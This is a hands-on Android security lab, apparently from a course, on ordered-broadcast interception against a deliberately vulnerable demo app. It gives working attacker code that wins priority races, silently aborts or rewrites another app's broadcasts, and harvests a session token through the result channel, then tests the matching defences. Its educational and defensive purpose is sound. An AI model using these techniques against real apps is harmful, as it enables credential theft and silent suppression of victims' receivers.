# Lab 03 — Ordered broadcasts and interception

> **Objective.** Understand the ordered broadcast as an *interception primitive*: win a
> priority race against another app, silently abort a chain, rewrite a result mid-flight,
> harvest a secret from the result channel — and then apply the two defences and prove each
> one works.

| | |
|---|---|
| **Difficulty** | Intermediate to Advanced |
| **Time** | 2–3 hours |
| **Needs an installed lab app?** | **Partly.** Parts 1–2 and 6 run on any device with no app. Parts 3–5 need the lab apps. |
| **Needs root?** | No |
| **Chapter sections** | [§3.5](../README.md#35-the-two-queues-and-the-deadline), [§3.6](../README.md#36-ordered-broadcasts--the-interception-primitive), [§5.3](../README.md#53-ordered-broadcast-interception) |

---

## Why this lab exists

An unordered broadcast is a fan-out: everybody gets a copy, nobody can affect anybody else.
It is boring and, apart from eavesdropping, safe.

An **ordered** broadcast is different in three ways, and each one is an attack:

1. Receivers are served **one at a time, in priority order**. Priority is an integer with no
   authorisation check, so anyone can be first.
2. Any receiver can call **`abortBroadcast()`**, and everyone below it silently never
   receives the message. They are not told. From their perspective the event did not happen.
3. A **result** — a code, a data string and an extras Bundle — flows forward through the
   chain and ends up back in the **sender's** process. If the sender is hostile, that is a
   channel out of the victim.

The historical example is SMS/OTP interception. That specific path is closed on modern
Android, but the primitive is completely intact for any ordered broadcast between two
ordinary apps — and, as this lab shows, `adb shell am broadcast` uses it by default, which
means most people have been exercising it without realising.

---

## Setup

Parts 1, 2 and 6 need nothing but a device. Parts 3–5 use the lab apps from
[`examples/`](../examples/README.md):

```bash
# host
cd 29-BroadcastReceivers/examples
export ANDROID_HOME=~/Android/Sdk
./build.sh
adb install -r build/vault-vulnerable.apk
```

If your device refuses `adb install` with `INSTALL_FAILED_USER_RESTRICTED` — the reference
device does, as an OEM policy — use an emulator for Parts 3–5. Parts 1, 2 and 6 are the
measurement half and run on the real device.

```bash
# host — record what you are testing on
adb shell getprop ro.product.model
adb shell getprop ro.build.version.sdk
```

---

## Part 1 — Discover that you have been sending ordered broadcasts all along

Most people learn `am broadcast` and assume it is `sendBroadcast()`. It is not.

### 1.1 Send a harmless custom broadcast

```bash
# host — an action nothing listens for
adb shell "am broadcast -a com.lab03.ORDER_TEST"
```

```
Broadcasting: Intent { act=com.lab03.ORDER_TEST flg=0x400000 }
Broadcast completed: result=0
```

That `result=0` is not decoration. It is the **final result code of an ordered chain**.

### 1.2 Confirm it from the platform's own records

```bash
# host
adb shell "dumpsys activity broadcasts" | grep -A8 "BroadcastRecord.*com.lab03.ORDER_TEST"
```

Reference:

```
    BroadcastRecord{98c1331 u0 com.lab03.ORDER_TEST} to user 0
    Intent { act=com.lab03.ORDER_TEST flg=0x400010 }
    caller=null null pid=9149 uid=2000
    enqueueClockTime=... dispatchClockTime=...
    resultTo=null resultCode=0 resultData=null
    resultAbort=false ordered=true sticky=false initialSticky=false
```

**`ordered=true`.** The `am` command supplies a result receiver so it can print
`Broadcast completed`, and supplying a result receiver is what makes a broadcast ordered.

### 1.3 Why this matters for every test you have ever run

| | `adb shell am broadcast` | an app's `sendBroadcast()` |
|---|---|---|
| Ordered? | **Yes** | No |
| Priority respected? | Yes | Irrelevant |
| `abortBroadcast()` effective? | Yes | No |
| Result channel active? | Yes | No |
| Caller uid | 2000 (shell) | 10xxx (app) |

Two consequences you have to internalise:

- A result-channel leak (Part 5) shows up for free when you use `am broadcast`, and would
  **not** show up for an ordinary app's `sendBroadcast()`.
- Conversely, a bug you can only reproduce with `am broadcast` may be unreachable to the
  attacker you are modelling. **Reproduce from an app.**

> **Checkpoint 1.**
> You can state, with the `dumpsys` line as evidence, that `am broadcast` sends an ordered
> broadcast, and name two consequences for your testing.

---

## Part 2 — The deadline, measured

Ordered means the queue *waits* for each receiver. That wait has a limit, and the limit is
readable from the device.

```bash
# host
adb shell "dumpsys activity broadcasts" | grep -A7 "bcast_fg_constants"
adb shell "dumpsys activity broadcasts" | grep -A7 "bcast_bg_constants"
```

Reference:

```
Broadcast parameters (key=bcast_fg_constants, observing=true):
  bcast_timeout = +10s0ms
  bcast_slow_time = +5s0ms
  bcast_deferral = +5s0ms
  bcast_deferral_decay_factor = 0.75
  bcast_deferral_floor = 0    bcast_allow_bg_activity_start_timeout = +10s0ms

Broadcast parameters (key=bcast_bg_constants, observing=true):
  bcast_timeout = +1m0s0ms
  ...
```

Fill in your own device's values:

| Constant | Your foreground | Your background | Reference |
|---|---|---|---|
| `bcast_timeout` | | | 10 s / 60 s |
| `bcast_slow_time` | | | 5 s / 5 s |
| `bcast_allow_bg_activity_start_timeout` | | | 10 s |

Three things follow, and only the first is obvious:

**The ANR budget.** A receiver in an ordered chain has 10 seconds on the foreground queue
before AMS declares it hung and moves on.

**A denial-of-service primitive.** A malicious high-priority receiver that deliberately
sleeps holds up every downstream receiver for the full timeout — per broadcast. On a
frequently-fired action that is a sustained degradation, not a one-off.

**A background-activity-start capability.** For 10 seconds after receiving a broadcast, the
receiving app may start an Activity from the background. A forged broadcast to a receiver
that then launches a screen puts a UI in front of the user with no tap. That is a phishing
surface, and it is the reason `bcast_allow_bg_activity_start_timeout` is in this list at
all.

### 2.1 Find the ordered broadcasts already flowing on your device

```bash
# host
adb shell "dumpsys activity broadcasts" \
  | grep -B4 "ordered=true" | grep "^    Intent {" | sort | uniq -c | sort -rn | head -20
```

Every line is an ordered chain a receiver could insert itself into — subject to the action
being forgeable and no `receiverPermission` being required.

### 2.2 Look for an abort that already happened

```bash
# host
adb shell "dumpsys activity broadcasts" | grep -B8 "resultAbort=true"
```

On a healthy device this is usually empty or shows system chains. **`resultAbort=true` on an
app's own ordered broadcast is interception**, and it is one of the few places the platform
records the fact.

> **Checkpoint 2.**
> You have your device's queue timeouts, you can name the three consequences, and you have
> listed the ordered broadcasts currently flowing.

---

## Part 3 — Win a priority race

Now the lab apps. `VaultApplication` registers `SyncResultWatcher` at **priority 999** for
`com.example.vault.SYNC_COMPLETE` — you saw this in Lab 02 Part 3 and parked it.

### 3.1 Confirm the target's priority

```bash
# host
adb shell "am start -n com.example.vault/.MainActivity"
frida -U -n com.example.vault -l ../scripts/hook-broadcast.js
```

```
bc.registrations()
```

Reference:

```
[registerReceiver] ContextWrapper(2 args)
    class      : com.example.vault.VaultApplication$SyncResultWatcher
    export     : EXPORTED (pre-33 default, 2-arg)  <-- ANY app can send to this receiver
    action   : com.example.vault.SYNC_COMPLETE
    priority : 999   <-- ordered broadcasts reach this filter EARLY; it can abortBroadcast()
```

> **Note**
> The manifest also declares `UpdateInterceptor` at `android:priority="2147483647"` for the
> same action. That one **is** visible statically. The runtime one at 999 is not. Both are
> the same primitive; only one is auditable from an APK.

### 3.2 Register above it

Add this to the attacker app, or use a small Frida script injected into any app you control:

```java
// attacker app — no permissions required
IntentFilter f = new IntentFilter("com.example.vault.SYNC_COMPLETE");
f.setPriority(Integer.MAX_VALUE);              // 2147483647
registerReceiver(new BroadcastReceiver() {
    @Override public void onReceive(Context c, Intent i) {
        Log.i("attacker", "FIRST. carried result = " + getResultData());
        setResultData("tampered");
        abortBroadcast();
    }
}, f);
```

Two apps now claim `Integer.MAX_VALUE`. Ties are broken by registration order, which is a
race — and a real one; malware has exploited exactly this by registering as early as
possible in `Application.onCreate`.

### 3.3 Fire the chain and observe

```bash
# host
adb shell "am broadcast -a com.example.vault.SYNC_COMPLETE"
adb logcat -d -s attacker SyncWatch | tail -20
adb shell "dumpsys activity broadcasts" | grep -A8 "SYNC_COMPLETE" | head -12
```

What to look for:

| Evidence | Meaning |
|---|---|
| `attacker: FIRST.` in logcat | You won the race |
| No `SyncWatch:` line at all | The victim's receiver never ran — **silent interception** |
| `resultAbort=true` in the record | The platform recorded the abort |

### 3.4 Prove the silence

Restart the attacker without the `abortBroadcast()` call and fire again. The victim's
`SyncWatch` line appears. Add the abort back; it disappears. **The victim gets no error, no
callback and no indication.** That is the property that makes this dangerous: an app whose
security agent depends on an ordered broadcast can be neutralised, and it will not know.

> **Checkpoint 3.**
> You have suppressed another app's receiver, and you can show both the presence and the
> absence of its log line under otherwise identical conditions.

---

## Part 4 — Rewrite the result mid-chain

Interception is not only suppression. You can let the chain continue and change what it
carries.

### 4.1 Remove the abort, keep the rewrite

```java
@Override public void onReceive(Context c, Intent i) {
    Log.i("attacker", "carried in : " + getResultData());
    setResultCode(999);
    setResultData("tampered");
    Bundle e = getResultExtras(true);
    e.putString("injected", "yes");
    setResultExtras(e);
    // no abort — the chain continues, carrying our values
}
```

### 4.2 Fire and trace

```bash
# host
adb shell "am broadcast -a com.example.vault.SYNC_COMPLETE"
adb logcat -d -s attacker SyncWatch | tail -20
```

`SyncWatch` now logs `result carried: tampered` instead of whatever the previous receiver
put there.

### 4.3 Why this is worse than abort in some designs

Some apps implement a claim protocol over ordered broadcasts: "the first receiver that can
handle this sets the result code to `HANDLED`, and later receivers check it and stand down".
Any app that wins the priority race controls that decision — it can claim every message, or
it can un-claim messages so that two handlers both act.

That is not a hypothetical anti-pattern; it is the shape of every ordered-broadcast-based
dispatch system, including the historical SMS handling the platform itself used.

> **Checkpoint 4.**
> You changed what a downstream receiver in another app observed, without preventing it
> from running.

---

## Part 5 — Harvest a secret from the result channel

This is the one that produces High-severity findings.

### 5.1 The vulnerable pattern

`ConfigSyncReceiver-vulnerable.java` contains:

```java
String token = prefs.getString("session_token", null);
if (token != null) {
    setResultCode(1);
    setResultData(token);          // "so our other receiver can read it"
}
```

The developer's mental model is that `setResultData` hands the value to the framework, which
hands it to their other receiver. What it actually does is put the value on a channel whose
terminus is the **sender's** process.

### 5.2 Seed a token

```bash
# host
adb shell "am start -n com.example.vault/.MainActivity"
# the demo app writes a session_token on first launch; verify:
adb shell "run-as com.example.vault cat shared_prefs/vault_config.xml"
```

### 5.3 Harvest it from an app

```java
// attacker app — zero permissions
Intent i = new Intent("com.example.vault.ACTION_SYNC_CONFIG");
i.setPackage("com.example.vault");
sendOrderedBroadcast(i,
    null,                                  // receiverPermission — none needed
    new BroadcastReceiver() {              // runs LAST, in OUR process
        @Override public void onReceive(Context c, Intent x) {
            Log.i("attacker", "resultCode = " + getResultCode());
            Log.i("attacker", "resultData = " + getResultData());   // the token
            Bundle e = getResultExtras(false);
            if (e != null) for (String k : e.keySet())
                Log.i("attacker", "resultExtra[" + k + "] = " + e.get(k));
        }
    },
    null, Activity.RESULT_CANCELED, null, null);
```

```bash
# host
adb shell "am start -n com.attacker.bcast/.AttackerBroadcaster"
adb logcat -d -s attacker | grep resultData
```

The victim's session token, in the attacker's log, with **no permission, no user
interaction, and nothing in any log the victim reads**.

### 5.4 And partly from a shell, because `am broadcast` is ordered

```bash
# host
adb shell "am broadcast -a com.example.vault.ACTION_SYNC_CONFIG -p com.example.vault"
```

```
Broadcast completed: result=1
```

The result **code** comes back on stdout. The result **data** does not — `am` does not print
it. So a shell test tells you the channel is live but not what is on it, which is exactly
why "I saw `result=1`" is not a finding and the app-side harvest is.

> **Checkpoint 5.**
> You have another app's secret in your process, obtained through the ordered-broadcast
> result channel.

---

## Part 6 — The two defences, and proving each one

There are exactly two mechanisms that defend an ordered broadcast, plus one that removes the
question.

### 6.1 `FLAG_RECEIVER_NO_ABORT` — stops suppression, not observation

```java
// sender
Intent i = new Intent("com.example.vault.SYNC_COMPLETE");
i.addFlags(0x08000000);                    // FLAG_RECEIVER_NO_ABORT
sendOrderedBroadcast(i, null);
```

Test it:

```bash
# host — 0x08000000 = FLAG_RECEIVER_NO_ABORT
adb shell "am broadcast -a com.example.vault.SYNC_COMPLETE -f 0x08000000"
adb logcat -d -s attacker SyncWatch | tail
```

The attacker's receiver still runs first and still sees the payload. Its
`abortBroadcast()` is ignored, and `SyncWatch` runs.

| Protects against | Does not protect against |
|---|---|
| Suppression | Observation, result rewriting, stalling |

**So it is a partial defence.** Useful, insufficient alone.

### 6.2 `receiverPermission` — removes the attacker from the chain entirely

```java
// sender
sendOrderedBroadcast(i, "com.example.vault.permission.INTERNAL_SYNC", ...);
```

with, in the manifest:

```xml
<permission android:name="com.example.vault.permission.INTERNAL_SYNC"
            android:protectionLevel="signature" />
<uses-permission android:name="com.example.vault.permission.INTERNAL_SYNC" />
```

You cannot intercept what you cannot receive. Test it:

```bash
# host
adb shell "am broadcast -a com.example.vault.SYNC_COMPLETE \
    --receiver-permission com.example.vault.permission.INTERNAL_SYNC"
adb logcat -d -s attacker | tail
```

Nothing in the attacker's log. Verify the level is real, because this is where the defence
usually fails:

```bash
# host
adb shell "pm list permissions -f" | grep -A3 "com.example.vault.permission.INTERNAL_SYNC"
```

`protectionLevel` must read `signature`. A `normal` permission is granted to any app that
declares `<uses-permission>` for it, so the "defence" is one manifest line away from
useless. Prove this to yourself: change the level to `normal`, add the `<uses-permission>`
to the attacker, and watch the interception work again.

### 6.3 The move that removes the question

Do not use an ordered broadcast. Almost nothing needs one.

| Instead of | Use |
|---|---|
| Ordered broadcast for internal fan-out | `setPackage()` + unordered + a signature `receiverPermission` |
| Ordered broadcast as an in-app event bus | `LocalBroadcastManager`, `StateFlow`, `LiveData`, or a plain listener registry — none of which reach AMS at all |
| Ordered broadcast as a claim protocol | A bound service, where [Binder caller identity is unforgeable](../../25-Binder/README.md) |
| Ordered broadcast to return data | Anything else. A fan-out primitive with a return channel is the shape that produced Part 5. |

### 6.4 Defence matrix

| Defence | Stops suppression | Stops observation | Stops result rewriting | Stops the result leak | Stops stalling |
|---|---|---|---|---|---|
| `FLAG_RECEIVER_NO_ABORT` | **Yes** | No | No | No | No |
| `receiverPermission` (signature) | **Yes** | **Yes** | **Yes** | No — the sender still gets the result, but only trusted senders can send | **Yes** |
| `setPackage()` | **Yes** | **Yes** | **Yes** | **Yes** | **Yes** |
| Not using an ordered broadcast | **Yes** | n/a | n/a | **Yes** | **Yes** |
| Not putting secrets in `setResultData` | No | No | No | **Yes** | No |

Read the bottom two rows together: the only complete answers are structural.

> **Checkpoint 6.**
> You have tested both defences, shown what each does and does not cover, and demonstrated
> that a `normal`-level permission is not a defence at all.

---

## Hints

<details>
<summary><b>Hint 1 — my high-priority receiver is not going first</b></summary>

Four causes:

1. **The broadcast is not ordered.** Priority is ignored entirely for parallel broadcasts.
   Check `ordered=true` in the history record.
2. **Registration order.** Equal priorities are broken by registration order. Register
   earlier — in `Application.onCreate`, before the target's process even starts.
3. **You are comparing across categories.** Runtime-registered receivers are served before
   manifest ones for the same broadcast, independently of priority.
4. **A `receiverPermission` excluded you.** You are not in the chain, so there is no race.
</details>

<details>
<summary><b>Hint 2 — `abortBroadcast()` throws or does nothing</b></summary>

`abortBroadcast()` on a non-ordered broadcast raises an exception on some releases and is a
no-op on others. Either way it is telling you the broadcast is parallel. Also check for
`FLAG_RECEIVER_NO_ABORT` (`0x08000000`) in the record's `flg=` field.
</details>

<details>
<summary><b>Hint 3 — `getResultData()` is always null</b></summary>

Three possibilities: the broadcast is not ordered; no earlier receiver called
`setResultData()`; or you are reading it after `goAsync()` without using the
`PendingResult`'s accessors. In a `goAsync()` receiver the result setters live on the
`PendingResult`, not on the receiver.
</details>

<details>
<summary><b>Hint 4 — how do I see the whole delivery order?</b></summary>

The history record lists it:

```bash
adb shell "dumpsys activity broadcasts" | grep -A40 "BroadcastRecord.*SYNC_COMPLETE" | grep "Deliver"
```

```
Deliver 0 #0: BroadcastFilter{...}
Deliver +3ms #1: BroadcastFilter{...}
```

Each line is one recipient, in order, with the elapsed time. Match the `BroadcastFilter`
hashes against the `Registered Receivers` section of the same dump to identify who is who.
</details>

<details>
<summary><b>Hint 5 — I cannot install the attacker app</b></summary>

Use drozer, whose agent is an ordinary app:

```
dz> run app.broadcast.send --action com.example.vault.SYNC_COMPLETE
```

drozer cannot easily register a high-priority receiver, so Part 3 needs a real app or an
emulator. Parts 1, 2 and 6 do not.
</details>

---

## Success criteria

- [ ] You proved, from `dumpsys`, that `am broadcast` sends an ordered broadcast, and named
      two consequences for your testing methodology.
- [ ] You recorded your device's foreground and background `bcast_timeout` values.
- [ ] You named the three consequences of the timeout, including the background-activity-start
      window.
- [ ] You won a priority race against another app's receiver.
- [ ] You suppressed that receiver and showed its log line present and absent under
      otherwise identical conditions.
- [ ] You rewrote a result that a downstream receiver in another app then observed.
- [ ] You harvested a secret through the ordered-broadcast result channel, from an app.
- [ ] You tested `FLAG_RECEIVER_NO_ABORT` and stated precisely what it does not cover.
- [ ] You tested a `signature` `receiverPermission`, then downgraded it to `normal` and
      showed the interception working again.
- [ ] You can complete the defence matrix from memory.

---

## What you should take away

**One.** Priority is an unauthenticated integer. Anyone can be first, and
`Integer.MAX_VALUE` is a value real apps use — measured on a stock device, a preinstalled
app held `priority=2147483647` on `BOOT_COMPLETED`.

**Two.** `abortBroadcast()` is *silent*. The victim receives nothing and is told nothing.
Any design that depends on an ordered broadcast arriving can be neutralised without raising
an error.

**Three.** The result channel points at the **sender**. `setResultData(secret)` gives the
secret to whoever sent the broadcast, and any app can be that sender.

**Four.** `am broadcast` has been exercising all of this for you by default. That is a gift
for finding result leaks and a trap for concluding that an ordinary app can reach them.

**Five.** The only complete defences are structural: do not use an ordered broadcast; keep
it inside the app with `setPackage()`; and never put a secret on a channel that terminates
at an untrusted sender.

---

## Next

- [Lab 04 — CTF: the receiver that is not there](lab-04-ctf-the-receiver-that-is-not-there.md)
  — five flags, combining everything from Labs 01–03.
- [Lab 01](lab-01-map-the-runtime-receiver-surface.md) and
  [Lab 02](lab-02-forge-a-broadcast.md) if you skipped ahead.
